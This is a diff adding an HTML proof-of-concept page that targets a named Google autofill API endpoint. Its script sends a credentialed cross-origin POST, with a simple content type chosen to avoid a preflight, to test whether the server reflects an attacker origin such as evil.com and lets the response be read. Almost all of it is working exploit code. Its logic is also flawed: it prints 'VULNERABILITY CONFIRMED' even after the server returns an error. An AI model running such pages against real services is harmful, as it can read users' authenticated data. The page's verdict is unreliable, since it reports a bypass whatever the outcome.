@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC for content-autofill.googleapis.com</title>
+</head>
+<body>
+    <h1>Attempting Cross-Origin Data Read...</h1>
+    <pre id="output"></pre>
+
+    <script>
+        const vulnerableUrl = 'https://content-autofill.googleapis.com/v1/forms:vote?alt=proto';
+        const output = document.getElementById('output');
+
+        // This is the simplest possible POST request.
+        // The browser will automatically send:
+        // 1. Origin: [The domain hosting this file, e.g., https://www.evil.com]
+        // 2. Sec-Fetch-Mode: cors
+        
+        // The most crucial part is 'credentials: "include"' if you suspect 
+        // the endpoint would return authenticated data (cookies, auth headers, etc.)
+        fetch(vulnerableUrl, {
+            method: 'POST',
+            // Use 'same-origin' or 'include' for credentials to simulate a real attack,
+            // even if the original request didn't send cookies.
+            credentials: 'include', 
+            // We need a body to match the original POST, even if it's minimal.
+            // Since the API uses protobuf, we send a minimal dummy body.
+            body: 'Dummy Data', 
+            headers: {
+                'Content-Type': 'text/plain' // Use a simple Content-Type to avoid a complex CORS preflight
+            }
+        })
+        .then(response => {
+            // This part of the code will execute ONLY if the browser allows 
+            // reading the response due to the Access-Control-Allow-Origin header.
+            if (response.ok) {
+                output.textContent += `\nSUCCESS: Status ${response.status} OK. The browser allowed reading the response!`;
+                
+                // Attempt to read the content, which confirms the SOP bypass.
+                // It will be empty, but the success confirms the bug.
+                return response.text(); 
+            } else {
+                output.textContent += `\nFAILURE: Server responded with status ${response.status}.`;
+            }
+        })
+        .then(data => {
+            output.textContent += `\nResponse Data (Body Length: ${data ? data.length : 0}): "${data}"`;
+            output.textContent += "\n\nVULNERABILITY CONFIRMED: The SOP was bypassed because the server reflected the Origin header, allowing the script to read the response.";
+        })
+        .catch(error => {
+            output.textContent += '\nError: The request failed or was blocked by the browser.';
+            output.textContent += '\n(If the browser blocked it, it means your "evil" domain wasn\'t the one reflected by the server. Check your origin header.)';
+        });
+    </script>
+</body>
+</html>
